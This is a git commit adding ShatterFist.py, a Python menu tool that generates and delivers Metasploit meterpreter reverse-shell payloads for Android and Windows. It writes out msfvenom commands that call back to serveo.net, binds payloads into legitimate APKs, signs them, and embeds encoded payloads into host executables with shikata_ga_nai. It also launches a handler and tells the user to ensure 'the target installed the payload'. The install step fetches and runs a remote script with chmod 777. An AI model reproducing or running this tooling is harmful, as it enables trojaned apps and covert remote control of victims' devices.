857f6f4b0c693d4d16ffc6f80789ece9ae7e6111
SlickPunk666 <53374327+SLICK-PUNK@users.noreply.github.com>
2020-07-02 13:12:38 +0530

    Add files via upload

---
+++ ShatterFist.py
@@ -0,0 +1,283 @@
+# -*- coding: utf-8 -*-
+"""
+Created on Tue Jun 30 12:38:15 2020
+
+@author: slickpunk666
+"""    
+import os, time, sys
+def prRed(skk): print("\033[91m {}\033[00m" .format(skk)) 
+def prGreen(skk): print("\033[92m {}\033[00m" .format(skk)) 
+def prYellow(skk): print("\033[93m {}\033[00m" .format(skk)) 
+def prLightPurple(skk): print("\033[94m {}\033[00m" .format(skk)) 
+def prPurple(skk): print("\033[95m {}\033[00m" .format(skk)) 
+def prCyan(skk): print("\033[96m {}\033[00m" .format(skk)) 
+def prLightGray(skk): print("\033[97m {}\033[00m" .format(skk)) 
+def prBlack(skk): print("\033[98m {}\033[00m" .format(skk)) 
+prRed('''
+                                                   
+                             ,@@@@@@@&/                                         
+                           ,&@@@@@@@@@@@@(.                                     
+                          #@@@@@@@@@@@@@@@@#. .                                 
+                         %@@@@@@@@@@@@@@@@(*&@@@@&/.                            
+                      .#@@@@@@@@@@@@@@@@%,#@@@@@@@@@@@%                         
+                  .,  *&@@@@@@@@@@@@@@@#*&@@@@@@@@@@@@@@@%,                     
+               .%@@@@@@&#(/(&@@@@@@@@%,(@@@@@@@@@@@@@@@@@&,                     
+             .(@@@@@@@@@@@@@@#((##%%,.@@@@@@@@@@@@@@@@@@@((%(.                  
+            /@@@@@@@@@@@@@@@@@@@@@@@%*.,#@@@@@@@@@@@@@@%.@@@@@@@*               
+          .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&*,(@@@@@@@&.&@@@@@@@@@@&/            
+         #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(.@@@@&*(@@@@@@@@@@@@@@@&,         
+       /@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&.&@@&/,%@@@@@@@@@@@@@@@@%.         
+     *&@@@@@@@@@@@@@@@@#.,%@@@@@@@@@@@@@@@@@(.&#  /@@@@@@@@@@@@@@@@@( .&@&.     
+    (@@@@@@@@@@@@@@@@@@@*   (@@@@@@@@@@@@&(.    .&@@@@@@@@@@@@@@@@&,.%@@@@@&.   
+  .(@@@@@@@@@@@@@@@@@@%.      ./(/,    .*#%/   (@@@@@@@@@@@@@@@@@..#@@@@@@@@@&* 
+ .&@@@@@@@@@@@@@@@@#*,         *#%@@@@@@@#*  /@@@@@@@@@@@@@@@@&,*&@@@@@@@@@@@@@#
+(@@@@@@@@@@@@@@@@@@@@@@&(,     ./#@@@@@%.  ,&@@@@@@@@@@@@@@@&,*@@@@@@@@@@@@@@@#.
+ *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#,    ,/.   .#@@@@@@@@@@@@@@@/*&@@@@@@@@@@@@@@/   
+   (@@@@@@@@@@@@@@@@@@@@@@@@@@@@%, ,#/,,.      *&@@@@@@@@*,&@@@@@@@@@@@@@@,     
+     ,%@@@@@@@@@@@@@@@@@@@@@@@@@@@(  #@@@@@@@@&%/*. ,(/ *@@@@@@@@@@@@@@&*%%     
+      .(&@@@@@@@@@@@@@@@@@@@@@@@@@@@/ ,%@@@@@@@@@@@@@%* #@@@@@@@@@@@&((@@@,     
+         #@@@@@@@@@@@@@@@@@@@@@@@@@@@@* ,%@@@@@@@@@@@@@@@/*&@@@@@#,/@@@@@%      
+          ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@&* .#@@@@@@@@@@@@@@@#,/(.*@@@@@@@(       
+            (@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.  (@@@@@@@@@@@@@@@@@@@@@@@@@@@       
+             ./%@@@@@@@@@@@@@@@@@@@@@@@@@@@/  /@@@@@@@@@@@@@@@@@@@@@@@@@/       
+                /@@@@@@@@@@@@@@@@@@@@@@@@@@@@* ,@@@@@@@@@@@@@@@@@@@@@@@&.       
+                 .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.*@@@@@@@@@@@@@@@@@@@@@@*        
+                   *@@@@@@@@@@@@@@@@@@@@@@@@@@@@#/@@@@@@@@@@@@@@@@@@@@/         
+                     /@@@@@@@@@@@@@@@@@@@@@@@@@@%./@@@@@@@@@@@@@@@@@@#.         
+                      .%@@@@@@@@@@@@@@@@@@@@&/     (@@@@@@@@@@@@@@@#.           
+                        (@@@@@@@@@@@@@@@@#*,,**      .&@@@@@@@@@@@.             
+                         %@@@@@@@@@@@@@@@@@@@@@*  /@@@@@@@@@@@@&*               
+                        ,&@@@@@@@@@@@@@@@@@@@@@& .%@@@@@@@@@@@/                 
+                        #@@@@@@@@@@@@@@@@@@@@@@@*.%@@@@@@@@@@@*                 
+                       .%@@@@@@@@@@@@@@@@@@@@@@@%.%@@@@@@@@@@@*                 
+                       *&@@@@@@@@@@@@@@@@@@@@@@@%,%@@@@@@@@@@@,                 
+                      .#@@@@@@@@@@@@@@@@@@@@@@@@%,%@@@@@@@@@@&,                 
+                      .#@@@@@@@@@@@@@@@@@@@@@@@@&/%@@@@@@@@@@&,                 
+                      /@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@&.                 
+                     .#@@@@@@@@@@@@@@@@@@@@@@@@@@(/@@@@@@@@@@&.                 
+                     *@@@@@@@@@@@@@@@@@@@@@@@@@@@&%@@@@@@@@@@&,                 
+                    .&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&,                 
+                    .&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&.                 
+                    .&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/                  
+                     ,/#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,
+                                                 ''')
+time.sleep(1)                                                 
+print('''     
+
+  █████████  █████                 █████     █████                      
+ ███░░░░░███░░███                 ░░███     ░░███                       
+░███    ░░░  ░███████    ██████   ███████   ███████    ██████  ████████ 
+░░█████████  ░███░░███  ░░░░░███ ░░░███░   ░░░███░    ███░░███░░███░░███
+ ░░░░░░░░███ ░███ ░███   ███████   ░███      ░███    ░███████  ░███ ░░░ 
+ ███    ░███ ░███ ░███  ███░░███   ░███ ███  ░███ ███░███░░░   ░███     
+░░█████████  ████ █████░░████████  ░░█████   ░░█████ ░░██████  █████    
+ ░░░░░░░░░  ░░░░ ░░░░░  ░░░░░░░░    ░░░░░     ░░░░░   ░░░░░░  ░░░░░     
+ ███████████  ███           █████                                       
+░░███░░░░░░█ ░░░           ░░███                                        
+ ░███   █ ░  ████   █████  ███████                                      
+ ░███████   ░░███  ███░░  ░░░███░                                       
+ ░███░░░█    ░███ ░░█████   ░███                                        
+ ░███  ░     ░███  ░░░░███  ░███ ███                                    
+ █████       █████ ██████   ░░█████                                     
+░░░░░       ░░░░░ ░░░░░░     ░░░░░                           
+                                         ''')
+prRed("                          -SlickPunk")
+print ('''The All in One Tool To Generate and Run payloads!''')  
+
+      
+def install():
+    os.system('''cd $HOME && apt update && apt update --fix-missing && apt upgrade -y && pkg install git curl wget nmap -y && curl -LO raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh && chmod 777 metasploit.sh && ./metasploit.sh && cd $HOME &&
+              apt install perl libllvm protobuf c-ares libltdl glib libandroid-shmem libicu libyaml autoconf bison clang coreutils curl findutils apr apr-util postgresql openssl readline libffi libgmp libpcap libsqlite libgrpc libtool libxml2 libxslt ncurses make ruby ncurses-utils ncurses git wget unzip zip tar termux-tools termux-elf-cleaner resolv-conf pkg-config -y
+              && pip install wheel && pip install lxml && python3 -m pip install requests && cd $HOME && git clone https://github.com/Hax4us/Apkmod.git
+              cd apkmod && chmod 777 setup.sh && ./setup.sh && cd $HOME && apkmod -u ''')
+              
+              
+ins = input('''Do you want to install all required dependencies and packages? This will also install additional packages so you can install \n any tool without errors ^w^ y/n
+Run Only Once! ''') 
+if ins.lower() == 'y':
+    install()
+os.system("clear") 
+prRed('''
+                                                  
+                             ,@@@@@@@&/                                         
+                           ,&@@@@@@@@@@@@(.                                     
+                          #@@@@@@@@@@@@@@@@#. .                                 
+                         %@@@@@@@@@@@@@@@@(*&@@@@&/.                            
+                      .#@@@@@@@@@@@@@@@@%,#@@@@@@@@@@@%                         
+                  .,  *&@@@@@@@@@@@@@@@#*&@@@@@@@@@@@@@@@%,                     
+               .%@@@@@@&#(/(&@@@@@@@@%,(@@@@@@@@@@@@@@@@@&,                     
+             .(@@@@@@@@@@@@@@#((##%%,.@@@@@@@@@@@@@@@@@@@((%(.                  
+            /@@@@@@@@@@@@@@@@@@@@@@@%*.,#@@@@@@@@@@@@@@%.@@@@@@@*               
+          .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&*,(@@@@@@@&.&@@@@@@@@@@&/            
+         #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(.@@@@&*(@@@@@@@@@@@@@@@&,         
+       /@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&.&@@&/,%@@@@@@@@@@@@@@@@%.         
+     *&@@@@@@@@@@@@@@@@#.,%@@@@@@@@@@@@@@@@@(.&#  /@@@@@@@@@@@@@@@@@( .&@&.     
+    (@@@@@@@@@@@@@@@@@@@*   (@@@@@@@@@@@@&(.    .&@@@@@@@@@@@@@@@@&,.%@@@@@&.   
+  .(@@@@@@@@@@@@@@@@@@%.      ./(/,    .*#%/   (@@@@@@@@@@@@@@@@@..#@@@@@@@@@&* 
+ .&@@@@@@@@@@@@@@@@#*,         *#%@@@@@@@#*  /@@@@@@@@@@@@@@@@&,*&@@@@@@@@@@@@@#
+(@@@@@@@@@@@@@@@@@@@@@@&(,     ./#@@@@@%.  ,&@@@@@@@@@@@@@@@&,*@@@@@@@@@@@@@@@#.
+ *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#,    ,/.   .#@@@@@@@@@@@@@@@/*&@@@@@@@@@@@@@@/   
+   (@@@@@@@@@@@@@@@@@@@@@@@@@@@@%, ,#/,,.      *&@@@@@@@@*,&@@@@@@@@@@@@@@,     
+     ,%@@@@@@@@@@@@@@@@@@@@@@@@@@@(  #@@@@@@@@&%/*. ,(/ *@@@@@@@@@@@@@@&*%%     
+      .(&@@@@@@@@@@@@@@@@@@@@@@@@@@@/ ,%@@@@@@@@@@@@@%* #@@@@@@@@@@@&((@@@,     
+         #@@@@@@@@@@@@@@@@@@@@@@@@@@@@* ,%@@@@@@@@@@@@@@@/*&@@@@@#,/@@@@@%      
+          ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@&* .#@@@@@@@@@@@@@@@#,/(.*@@@@@@@(       
+            (@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.  (@@@@@@@@@@@@@@@@@@@@@@@@@@@       
+             ./%@@@@@@@@@@@@@@@@@@@@@@@@@@@/  /@@@@@@@@@@@@@@@@@@@@@@@@@/       
+                /@@@@@@@@@@@@@@@@@@@@@@@@@@@@* ,@@@@@@@@@@@@@@@@@@@@@@@&.       
+                 .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.*@@@@@@@@@@@@@@@@@@@@@@*        
+                   *@@@@@@@@@@@@@@@@@@@@@@@@@@@@#/@@@@@@@@@@@@@@@@@@@@/         
+                     /@@@@@@@@@@@@@@@@@@@@@@@@@@%./@@@@@@@@@@@@@@@@@@#.         
+                      .%@@@@@@@@@@@@@@@@@@@@&/     (@@@@@@@@@@@@@@@#.           
+                        (@@@@@@@@@@@@@@@@#*,,**      .&@@@@@@@@@@@.             
+                         %@@@@@@@@@@@@@@@@@@@@@*  /@@@@@@@@@@@@&*               
+                        ,&@@@@@@@@@@@@@@@@@@@@@& .%@@@@@@@@@@@/                 
+                        #@@@@@@@@@@@@@@@@@@@@@@@*.%@@@@@@@@@@@*                 
+                       .%@@@@@@@@@@@@@@@@@@@@@@@%.%@@@@@@@@@@@*                 
+                       *&@@@@@@@@@@@@@@@@@@@@@@@%,%@@@@@@@@@@@,                 
+                      .#@@@@@@@@@@@@@@@@@@@@@@@@%,%@@@@@@@@@@&,                 
+                      .#@@@@@@@@@@@@@@@@@@@@@@@@&/%@@@@@@@@@@&,                 
+                      /@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@&.                 
+                     .#@@@@@@@@@@@@@@@@@@@@@@@@@@(/@@@@@@@@@@&.                 
+                     *@@@@@@@@@@@@@@@@@@@@@@@@@@@&%@@@@@@@@@@&,                 
+                    .&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&,                 
+                    .&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&.                 
+                    .&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/                  
+                     ,/#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,                  ''')
+time.sleep(1)
+print('''     
+  █████████  █████                 █████     █████                      
+ ███░░░░░███░░███                 ░░███     ░░███                       
+░███    ░░░  ░███████    ██████   ███████   ███████    ██████  ████████ 
+░░█████████  ░███░░███  ░░░░░███ ░░░███░   ░░░███░    ███░░███░░███░░███
+ ░░░░░░░░███ ░███ ░███   ███████   ░███      ░███    ░███████  ░███ ░░░ 
+ ███    ░███ ░███ ░███  ███░░███   ░███ ███  ░███ ███░███░░░   ░███     
+░░█████████  ████ █████░░████████  ░░█████   ░░█████ ░░██████  █████    
+ ░░░░░░░░░  ░░░░ ░░░░░  ░░░░░░░░    ░░░░░     ░░░░░   ░░░░░░  ░░░░░     
+ ███████████  ███           █████                                       
+░░███░░░░░░█ ░░░           ░░███                                        
+ ░███   █ ░  ████   █████  ███████                                      
+ ░███████   ░░███  ███░░  ░░░███░                                       
+ ░███░░░█    ░███ ░░█████   ░███                                        
+ ░███  ░     ░███  ░░░░███  ░███ ███                                    
+ █████       █████ ██████   ░░█████                                     
+░░░░░       ░░░░░ ░░░░░░     ░░░░░                           
+         ''') 
+         
+def generateandroidpayload():
+    os.system("cd $HOME")
+    x = input("Please enter The Port Number To be Used or enter a random number b/w 1024-65535: ")
+    print("Payload is generating please be patient [*]")
+    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=" + x + " -o $HOME/downloads/androidpayload.apk")
+    print ("The bare payload has been saved as $HOME/downloads/androidpayload.apk")
+    print ('''Choose additional options... (choosing any option 1,2,3 will cause the payload to regenerate.
+           No additional user input is needed.)
+           [1] Bind payload
+           [2] Sign payload
+           [3] Bind and Sign
+           [4] None. exit application''')
+    q1 = input()
+    if q1 == '1':
+        q2 = input("Please enter path of apk you want to bind to.")
+        os.system("apkmod -b " + q2 + " -o $HOME/downloads/androidpayloadbinded.apk LHOST=serveo.net LPORT=" + x)
+        prGreen("Binded payload is saved as $HOME/downloads/androidpayloadbinded.apk")
+        sys.exit()
+    elif q1 == '2':
+        os.system("apkmod -s $HOME/downloads/androidpayload.apk -o $HOME/downloads/androidpayloadsigned.apk ")
+        prGreen ("Signed payload saved as $HOME/downloads/androidpayloadsigned.apk ")
+    elif q1 == '3':
+        q2 = input("Please enter path of apk you want to bind to.")
+        os.system("apkmod -b " + q2 + " -o $HOME/downloads/androidpayloadbinded.apk LHOST=serveo.net LPORT=" + x)
+        os.system("apkmod -s $HOME/downloads/androidpayloadbinded.apk -o $HOME/downloads/androidpayloadbindednsigned.apk")
+        prGreen("Payload saved as $HOME/downloads/androidpayloadbindednsigned.apk")
+    elif q1 == '4':
+        print ("See you later Homie!")
+        sys.exit()
+    sys.exit()
+        
+    
+def exploitandroid():
+    os.system ("cd")
+    x = input("Please enter the port number you entered while generating the payload")
+    prLightPurple('''===================================================================================
+          Run this command in another session --> ssh -R ''' + x + ":localhost:" + x + ''' serveo.net
+          =======================================================================================''')
+    print("exploitation will start in 10 seconds")  
+    prYellow("make sure the target installed the payload")    
+    time.sleep(10)
+    os.system('cd $HOME ')
+    os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST localhost;set LPORT " + x + "run")
+def generatewindowspayload():
+     print("We recommend learning Windows Payloads manually. There is a lot to learn")
+     os.system ("cd $HOME")
+     x = input("Please enter The Port Number To be Used or enter a random number b/w 1024-65535: ")
+     print("Payload is generating please be patient [*]")
+     os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=serveo.net LPORT=" + x +" -o $HOME/downloads/windowspayload.exe")
+     prGreen ("The bare payload has been saved as $HOME/downloads/windowspayload.exe")
+     z1 = input("Do you want to embed the payload? (will cause payload to regenerate. May not work. Worth a shot.) y/n ")
+     if z1.lower() == "y":
+         n1 = input("path of parent exe file to embed in?: ")
+         print("Working...Please be patient[*]")
+         os.system('msfvenom -a x86 --platform windows -x ' + n1 + ' -k -p windows/meterpreter/reverse_tcp LHOST=serveo.net LPORT=' + x + ' -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe')
+     print("Bye fellow hacker!")
+     time.sleep(0.5)
+     sys.exit()
+def exploitwindowspayload():
+    os.system ("cd $HOME")
+    x = input("Please enter the port number you entered while generating the payload:")
+    prLightPurple('''=================================================================================== 
+          Run this command in another session --> ssh -R ''' + x + ''':localhost:''' + x + ''' serveo.net
+          =======================================================================================''')
+    print("exploitation will start in 10 seconds")  
+    prYellow("make sure the target ran the payload")
+    time.sleep(10)
+    os.system('cd $HOME ')
+    os.system("msfconsole -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST localhost;set LPORT " + x + "run")
+def choice1():
+    e1 = input('''Choose Platform
+               [1] Android
+               [2] Windows
+               [3] Exit''')
+    if e1 == '1':
+        generateandroidpayload()
+    elif e1 == '2':
+        generatewindowspayload()
+    sys.exit()
+def choice2():
+    e2 = input('''Choose Platform
+               [1] Android
+               [2] Windows
+               [3] Exit''')
+    if e2 == '1':
+        exploitandroid()
+    elif e2 == "2":
+        exploitwindowspayload()
+    prYellow("So long Amigo!")    
+    sys.exit()    
+                  
+prGreen ("The All in One Tool To Generate and Run payloads!")
+print ('''What Do You Want To Do Now?
+       [1] Make A Payload 
+       [2] Exploit Payload 
+       [0] Exit ''' )
+des1 = input() 
+if des1 == '1':
+    choice1()                             
+    
+elif des1 == '2':
+    choice2()
+sys.exit()
+
+
+
+
+
+
+
+
+      
+    
+    
+    
+       
+
